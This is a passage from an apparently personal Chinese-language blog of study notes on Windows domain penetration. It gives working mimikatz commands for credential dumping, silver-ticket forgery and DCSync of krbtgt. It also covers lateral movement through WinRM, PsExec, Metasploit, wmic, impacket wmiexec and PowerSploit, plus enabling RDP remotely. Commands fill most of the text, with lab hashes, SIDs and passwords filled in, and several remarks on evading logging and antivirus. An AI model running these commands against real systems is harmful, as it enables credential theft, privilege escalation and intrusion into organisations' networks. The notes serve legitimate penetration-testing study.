<p>获取域名</p>
<pre class="line-numbers language-none"><code class="language-none">#以下三条命令均可
whoami
net time &#x2F;domain
ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>获取SID</p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获取目标机器的FQDN</p>
<pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="制作白银票据伪造服务">制作白银票据伪造服务</h5>
<h6 id="伪造-CIFS-服务权限">伪造 CIFS 服务权限</h6>
<p>CIFS 服务常用于 Windows 主机之间的文件共享（从上面的白银票据的服务列表也能看出，Windows File Share服务对应需要伪造的是CIFS银票），首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p>
<pre class="line-numbers language-none"><code class="language-none">klist purge

#或者使用 mimikatz 清除
kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用 mimikatz 生成伪造的白银票据并注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit

#这里对上面命令用到的参数做一个说明
&#x2F;domain：域名称
&#x2F;sid：SID值
&#x2F;target：目标主机名
&#x2F;service：服务名称，这里需要访问共享文件，所以是cifs
&#x2F;rc4：目标主机上服务账户的NTLM hash
&#x2F;user：伪造的用户名
&#x2F;ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用&#x2F;ticket导出之后再使用kerberos::ptt来导入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121141025332.png" alt="image-20231121141025332"></p>
<p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p>
<h6 id="伪造-LDAP-服务权限">伪造 LDAP 服务权限</h6>
<p>这里介绍一下 LDAP 服务，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121202935043.png" alt="image-20231121202935043"></p>
<p>下面对其进行伪造白银票据</p>
<p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121141640189.png" alt="image-20231121141640189"></p>
<p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p>
<p>接下来生成 LDAP 服务的白银票据并注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121141425955.png" alt="image-20231121141425955"></p>
<p>在伪造票据后，就有权限进行 dcsync 操作了</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
lsadump::dcsync &#x2F;dc:OWA2010SP3 &#x2F;domain:0day.org &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h6 id="伪造-HOST和HTTP-服务权限">伪造 HOST和HTTP 服务权限</h6>
<p>这里是伪造 HOST 和 HTTP 的服务的白银票据访问目标计算机的 WinRM 服务</p>
<p>WinRM服务(Windows Remote Management)允许用户使用远程工具对本地Windows服务器进行管理</p>
<p>WinRM服务默认支持Kerberos验证，也就是说白银票据是可以用的</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;domain:0day.com &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:OWA2010SP3 &#x2F;rc4:46bcda1fa92aa7198598d4ad9ec7c055 &#x2F;service:HTTP &#x2F;user:administrator &#x2F;ptt
kerberos::golden &#x2F;domain:0day.com &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:OWA2010SP3 &#x2F;rc4:46bcda1fa92aa7198598d4ad9ec7c055 &#x2F;service:HOST &#x2F;user:administrator &#x2F;ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>伪造银票并注入内存后，可以使用WinRM服务</p>
<pre class="line-numbers language-none"><code class="language-none">#下面列举一些Winrm相关的命令
#自动配置winrm服务启动侦听（从Windows Server 2008开始，WinRM服务自动启动，但是不开启监听，使用winrm quickconfig进行配置后，将打开HTTP和HTTPS监听端口，同时Windows防火墙放行这两个端口）
#这里再补充一点，从WinRM2.0开始，服务的HTTP默认监听端口由原来的80&#x2F;TCP变更为5985&#x2F;TCP
winrm quickconfig
#查看winrm的运行情况
winrm e winrm&#x2F;config&#x2F;listener
#查看winrm的配置
winrm get winrm&#x2F;config
#将service中的allowUnencrypted设置为true，允许未加密的通讯
winrm set winrm&#x2F;config&#x2F;service @&#123;AllowUnencrypted&#x3D;&quot;true&quot;&#125;
#配置当前服务器允许被任意主机连接&#x2F;允许连接任意主机
winrm set winrm&#x2F;config&#x2F;client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在服务器端使用winrm quickconfig启动winrm服务之后，就可以使用winrs客户端连接服务器远程执行命令了。</p>
<pre class="line-numbers language-none"><code class="language-none">winrs -r:OWA2010SP3 -u:administrator -p:admin123$% &#39;whoami &#x2F;user&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121203549548.png" alt="image-20231121203549548"></p>
<h6 id="伪造-HOST-服务权限">伪造 HOST 服务权限</h6>
<p>还可以伪造HOST的白银票据访问目标计算机的计划任务服务(也就上面白银票据的服务列表中的Scheduled Tasks)</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;domain:0day.org &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:OWA2010SP3 &#x2F;rc4:46bcda1fa92aa7198598d4ad9ec7c055 &#x2F;service:HOST &#x2F;user:administrator &#x2F;ptt
kerberos::golden &#x2F;domain:0day.org &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:PC-JACK-0DAY &#x2F;rc4:b49b7d6036b024324459d19aa392bb08 &#x2F;service:HOST &#x2F;user:administrator &#x2F;ptt
kerberos::golden &#x2F;admin:administrator &#x2F;domain:0day.org &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:PC-JACK-0DAY &#x2F;rc4:b49b7d6036b024324459d19aa392bb08 &#x2F;service:HOST  &#x2F;ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>伪造并注入内存后，就获得了对计划任务管理的权限。下面使用Schtasks对计划任务进行操作，Schtasks前面介绍过，是一个可在本地或远程计算机创建、删除、查询、修改、运行和结束计划任务的工具。</p>
<pre class="line-numbers language-none"><code class="language-none">#创建计划任务运行计算器，实际环境中可运行任何可执行程序
schtasks &#x2F;create &#x2F;S OWA2010SP3 &#x2F;U administrator &#x2F;P admin123$% &#x2F;RU &quot;SYSTEM&quot; &#x2F;SC MINUTE &#x2F;TN &quot;Agent&quot; &#x2F;TR &quot;C:\Windows\System32\calc.exe&quot;
schtasks &#x2F;create &#x2F;S OWA2010SP3 &#x2F;U administrator &#x2F;P &quot;admin123$%&quot;  &#x2F;SC MINUTE &#x2F;TN &quot;Agent&quot; &#x2F;TR &quot;C:\Windows\System32\calc.exe&quot;
schtasks &#x2F;create &#x2F;S OWA2010SP3 &#x2F;SC MINUTE &#x2F;TN &quot;Agent&quot; &#x2F;TR &quot;C:\Windows\System32\calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h6 id="伪造-HOST和wsman-服务权限">伪造 HOST和wsman 服务权限</h6>
<p>这里再演示一下伪造HOST和wsman服务的白银票据进行Powershell 的远程执行（对应上面白银票据的服务列表中的PowerShell Remoting）</p>
<p>在Windows中，除了WinRM本身，其他一些工具和一些第三方工具也都借助了WinRM所提供的功能。例如<br>
PowerShell自2.0开始引入了Remoting技术，即远程执行PowerShell命令，此技术基于WinRM服务实现。</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;domain:0day.org &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:OWA2010SP3 &#x2F;rc4:46bcda1fa92aa7198598d4ad9ec7c055 &#x2F;service:HTTP &#x2F;user:administrator &#x2F;ptt
kerberos::golden &#x2F;domain:0day.org &#x2F;sid:S-1-5-21-1812960810-2335050734-3517558805 &#x2F;target:OWA2010SP3 &#x2F;rc4:46bcda1fa92aa7198598d4ad9ec7c055 &#x2F;service:wsman &#x2F;user:administrator &#x2F;ptt
#使用Kerberos票据进行验证，通过伪造白银票据注入内存的方式，不会再弹出要求输入密码的对话框，直接验证通过并建立连接
New-PSSession -Name PSC -ComputerName OWA2010SP3;Enter-PSSession -Name PSC
Enter-PSSession -ComputerName OWA2010SP3
#之后就可以远程执行PowerShell了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121214534368.png" alt="image-20231121214534368"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121214547605.png" alt="image-20231121214547605"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121214618250.png" alt="image-20231121214618250"></p>
<pre class="line-numbers language-none"><code class="language-none">#该命令会启动WinRM服务，创建允许入站的防火墙规则。
#powershell可以使用WMI、RPC和WS-Management在内等各种协议进行远程管理
Enable-PSRemoting -Force
#在列举一些涉及到的命令
#配置当前服务器允许被任意主机连接&#x2F;允许连接任意主机(和的winrm一样，上面也说到远程执行PowerShell命令技术是基于WinRM服务实现)
Set-Item wsman:\localhost\client\trustedhosts * 
#重启WinRm服务
Restart-Service WinRM
#测试目标计算机WinRM是否运行，Test-WsMan后跟hostname或者是IP地址
Test-WsMan OWA2010SP3

#建立与远程计算机的交互式会话，但是注意，它会在弹出对话框要求输入密码，密码正确后才会建立会话(返回远程计算机的Powersehll)，这里可以类比ssh连接理解
Enter-PSSession -ComputerName OWA2010SP3 -Credential Administrator
#也可以这样指定，会在弹出对话框要求输入用户名和密码
Enter-PSSession -ComputerName Server01 -Credential (Get-Credential)
#此外还可以这样指定，因为-Credential参数也可以指定一个凭据对象，Get-Credential用于创建一个凭据对象存入$cred变量中
$cred &#x3D; Get-Credential -UserName &quot;Administrator&quot; -Message &quot;Enter the password for Administrator&quot;
Enter-PSSession -ComputerName OWA2010SP3 -Credential $cred
#Enter-PSSession的参数，如下
-ComputerName：指定远程计算机的名称或IP地址
-Credential：指定用于连接到远程计算机的用户名&#x2F;凭据对象
-Port：指定要使用的端口号
-UseSSL：使用SSL加密连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里放三张Enter-PSSession建立连接“弹出对话框”的图，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121222807332.png" alt="image-20231121222807332"></p>
<p>命令执行后会弹出一个输入框，让你输入你的用户名密码。如果是在域环境下需要按照 domain\username的形式来输入用户名。如果使用-ComputerName参数指定用户名之后会让你输入这个用户的密码</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121222901128.png" alt="image-20231121222901128"></p>
<p>如果使用-ComputerName指定的是凭据对象，会在Get-Credential的时候就要求输入密码，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121224057947.png" alt="image-20231121224057947"></p>
<p>这里解释一下Get-Credential命令，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121224143249.png" alt="image-20231121224143249"></p>
<p>凭据对象即PSCredential， 是PowerShell 中的一个对象类型，具体介绍如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121224307311.png" alt="image-20231121224307311"></p>
<p>这里也说到，<mark>Enter-PSSession、Invoke-Command 等命令的 -Credential 参数实质上指定的就是凭据对象，上面说的指定用户名只是为了方便理解，本质上是创建了一个用户名为指定用户名的凭据对象，而凭据对象的密码为了安全不会在终端中输入，而是以弹出对话框的形式进行输入</mark>。这里在对比一下Invoke-Command和Enter-PSSession，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121230410523.png" alt="image-20231121230410523"></p>
<h2 id="PsExec的使用">PsExec的使用</h2>
<p>PsExec是SysInternals套件中的一款功能强大的软件。起初PsExec主要用于大批量Windows主机的运维，在域环境下效果尤其好。但是，攻击者渐渐开始使用PsExec，通过命令行环境与目标机器进行连接，甚至控制目标机器，而不需要通过远程桌面协议(RDP)进行图形化控制，降低了恶意操作被管理员发现的可能性(因为<mark>PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中</mark>)。</p>
<p>PsExec可以在Windows Vista/NT 4.0/2000/XP/Server 2003/Server 2008/Server 2012/Server 2016(包括64位版本)上运行</p>
<p>通过PsExec可以在远程计算机上执行命令，也可以将管理员权限提升到System权限以运行指定的程序。PsExec的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为“PSEXESVC”的二进制文件，然后通过psexec服务运行命令，运行结束后删除服务。</p>
<p>建立 ipc$ 连接</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
或者
net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116222635726.png" alt="image-20231116222635726"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116222609293.png" alt="image-20231116222609293"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116222702160.png" alt="image-20231116222702160"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116222721147.png" alt="image-20231116222721147"></p>
<p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe
# -u 域\用户名
# -p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或者执行以下命令直接回显命令结果</p>
<pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在使用PsExec时，需要注意以下几点：</p>
<ul>
<li>需要远程系统开启 admin$ 共享（默认是开启的）</li>
<li>因为 PsExec 连接的原理是基于 IPC 共享，因此<mark>目标需要开放 445 端口</mark></li>
<li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li>
<li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。<mark>由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程</mark>。</li>
<li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell（即在 administrator 权限的 shell中执行PsExec）</li>
<li>在域环境测试时发现，<mark>非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递</mark>。</li>
</ul>
<p>MSF 中也有PsExec的利用模块，分别是<code>exploit/windows/smb/psexec</code>和<code>exploit/windows/smb/psexec_psh</code></p>
<p>exploit/windows/smb/psexec_psh 模块生成的 payload 主要是由 PowerShell 编写的，免杀效果比exploit/windows/smb/psexec 模块要好。两个模块的使用方法相同，下面以exploit/windows/smb/psexec举例</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec
set rhost 192.168.7.7
set smbuser administrator
set smbpass 1qaz@WSX
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117143133760.png" alt="image-20231117143133760"></p>
<h2 id="WMI">WMI</h2>
<p><mark>WMI的全称为“Windows Management Instrumentation“。从Windows 98开始，Windows系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统</mark>。通过渗透测试发现，在使用wmiexec进行横向移动时，<mark>Windows操作系统默认不会将WMI的操作记录在日志中</mark>。因为在这个过程中不会产生日志，所以对网络管理员来说增加了攻击溯源成本。同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些</p>
<h3 id="wmic-命令">wmic 命令</h3>
<p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><mark>使用WMIC连接远程主机，需要目标主机开放135和445端口(135端口是WMIC默认的管理端口，wimcexec使用445端口传回显)</mark></p>
<p>之后建立 IPC$ ，使用 type 读取执行结果</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117144346474.png" alt="image-20231117144346474"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117144641846.png" alt="image-20231117144641846"></p>
<p>也可以预先建立 ipc$ 连接，再使用 wmic</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
wmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;
type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>注意事项：</p>
<ul>
<li>wmic没有回显，需要使用ipc$配合type命令来读取信息</li>
</ul>
<h3 id="impacket工具包中的wmiexec-py脚本">impacket工具包中的wmiexec.py脚本</h3>
<p>在 impacket 工具包里有 <a target="_blank" rel="noopener" href="http://wmiexec.py">wmiexec.py</a> 脚本，可以用来直接获取 shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>该方法主要在从Linux向Windows进行横向渗透测试时使用</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117145821976.png" alt="image-20231117145821976"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117145729928.png" alt="image-20231117145729928"></p>
<p><a target="_blank" rel="noopener" href="http://wmiexec.py">wmiexec.py</a> 还支持通过哈希传递获得 shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="wmiexec-vbs">wmiexec.vbs</h3>
<p><mark>wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。wniexec.vbs可以在远程系统中执行命令并进行回显</mark>，获得远程主机的半交互式Shell</p>
<p>wmiexec.vbs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p>
<pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117150712418.png" alt="image-20231117150712418"></p>
<p>使用 vmiexec.vbs 执行单条命令</p>
<pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。</p>
<p>在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。</p>
<p>不过目前 wmiexec.vbs 已经被卡巴斯基、赛门铁克、ZoneAlarm等杀软列入查杀名单了。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117202935978.png" alt="image-20231117202935978"></p>
<h3 id="Invoke-WmiCommand">Invoke-WmiCommand</h3>
<p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令</p>
<p>在 Powershell 中运行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none"># 导入 Invoke-WmiCommand.ps1 脚本
Import-Module .\Invoke-WmiCommand.ps1

# 指定目标系统用户名
$User &#x3D; &quot;teamssix.com\administrator&quot; 

# 指定目标系统的密码
$Password &#x3D; ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force

# 将账号和密码整合起来，以便导入 Credential
$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password

# 指定要执行的命令和目标 IP
$Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.7.7

# 将执行结果输出到屏幕上
$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117205433997.png" alt="image-20231117205433997"></p>
<h3 id="Invoke-WMIMethod">Invoke-WMIMethod</h3>
<p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。<mark>Invoke-WMIMethod 会以非交互式的方式执行命令，即不会回显执行结果</mark>。</p>
<pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名
$User&#x3D;&quot;teamssix.com\administrator&quot;

# 指定目标系统密码
$Password&#x3D;ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force

# 将账号和密码整合起来，以便导入 Credential中
$Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password

# 在远程系统中运行 calc.exe 命令
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117205637879.png" alt="image-20231117205637879"></p>
<p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了</p>
<h3 id="wmic-的其他命令">wmic 的其他命令</h3>
<p>使用 wmic 远程开启目标的 RDP</p>
<pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003
wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1

# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname
wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX RDTOGGLE WHERE ServerName&#x3D;&#39;dc&#39; call SetAllowTSConnections 1
或者
wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &#39;cmd.exe &#x2F;c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p>
<pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117210121552.png" alt="image-20231117210121552"></p>
<p>使用 wmic 远程重启目标计算机</p>
